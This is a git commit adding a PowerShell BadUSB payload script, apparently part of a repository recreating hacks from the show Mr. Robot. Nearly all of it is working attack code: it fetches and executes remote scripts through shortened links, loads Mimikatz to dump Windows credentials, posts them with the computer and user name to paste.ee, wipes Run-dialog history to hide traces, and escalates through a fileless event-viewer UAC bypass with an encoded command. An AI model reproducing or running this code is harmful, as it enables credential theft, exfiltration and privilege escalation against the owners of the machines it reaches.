998b3fe072ef728448dd71b5d52bf55db7c9c748
H3LL0WORLD <holamundoyt@gmail.com>
2016-09-03 23:13:22 -0500

    Update and rename Mr.Robot/01 - BadUSB.ps1 to Mr.Robot/01-BadUSB/Payload.ps1

---
+++ Mr.Robot/01-BadUSB/Payload.ps1
@@ -0,0 +1,27 @@
+function Invoke-Payload {
+param (
+	################################################
+	##          API Key from paste.ee             ##
+	  $api_key = ''
+	################################################
+	)
+	
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('C:\Dev\MrRobot\Hack 01 - Mimikatz Bad USB\Clean-RunMRU.psm1')
+	Clean-RunMRU -Last
+	
+	$Command = "
+	# Import Paste.ee API module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bNdwqV')
+	# Import Mimikatz module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
+	`$Creds = Invoke-Mimikatz -DumpCreds
+	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
+	New-Paste -api_key $api_key -description `$Description -paste `$Creds
+	"
+
+	## Fileless bypass uac
+	# Import EventVwrBypass module
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
+	# Execute bypass w/encoded command
+	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
+}
